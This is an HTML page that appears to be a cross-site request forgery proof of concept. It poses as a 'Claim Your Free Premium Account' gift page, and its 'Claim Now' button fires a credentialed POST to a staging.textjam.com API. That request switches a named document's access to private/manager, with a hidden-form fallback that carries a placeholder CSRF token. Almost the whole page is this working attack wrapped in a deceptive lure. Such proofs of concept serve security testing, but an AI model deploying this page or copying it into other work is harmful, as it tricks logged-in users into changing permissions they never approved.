<!DOCTYPE html>
<html>
<head>
    <title>Free Gift Claim</title>
    <style>
        body { font-family: Arial; padding: 20px; text-align: center; }
        .gift { font-size: 48px; margin: 20px; }
        .btn { 
            background: #FF6B6B; 
            color: white; 
            padding: 15px 30px; 
            border: none; 
            border-radius: 10px; 
            font-size: 18px; 
            cursor: pointer;
            margin: 20px;
        }
    </style>
</head>
<body>
    <div class="gift">üéÅ</div>
    <h2>Claim Your Free Premium Account!</h2>
    <p>Click below to verify your eligibility...</p>
    
    <button class="btn" onclick="performAttack()">Claim Now</button>
    
    <div id="status" style="margin-top: 20px; color: #666;"></div>

    <script>
    function performAttack() {
        document.getElementById('status').innerHTML = "Verifying your account...";
        
        // Perform stealth CSRF to make document private/manager
        fetch('https://staging.textjam.com/api/doc/E6VNBD2G/access/private/manager', {
            method: 'POST',
            credentials: 'include',  // Send cookies
            mode: 'no-cors',         // Avoid CORS issues
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({})  // May need empty object
        })
        .then(() => {
            document.getElementById('status').innerHTML = "‚úÖ Account verified! Redirecting...";
            
            // Redirect to document after changing permissions
            setTimeout(() => {
                window.location.href = "https://staging.textjam.com/doc/E6VNBD2G?message=Security+updated";
            }, 1500);
        })
        .catch(error => {
            document.getElementById('status').innerHTML = "‚ö†Ô∏è Verification failed. Trying alternative method...";
            fallbackMethod();
        });
    }
    
    function fallbackMethod() {
        // Alternative: Form submission method
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://staging.textjam.com/api/doc/E6VNBD2G/access/private/manager';
        form.style.display = 'none';
        
        // Try to include CSRF token if we can steal it
        var csrfInput = document.createElement('input');
        csrfInput.type = 'hidden';
        csrfInput.name = 'csrf_token';
        csrfInput.value = 'attacker_token'; // Would need real token
        
        form.appendChild(csrfInput);
        document.body.appendChild(form);
        form.submit();
        
        setTimeout(() => {
            window.location.href = "https://staging.textjam.com/doc/E6VNBD2G";
        }, 1000);
    }
    </script>
</body>
</html>
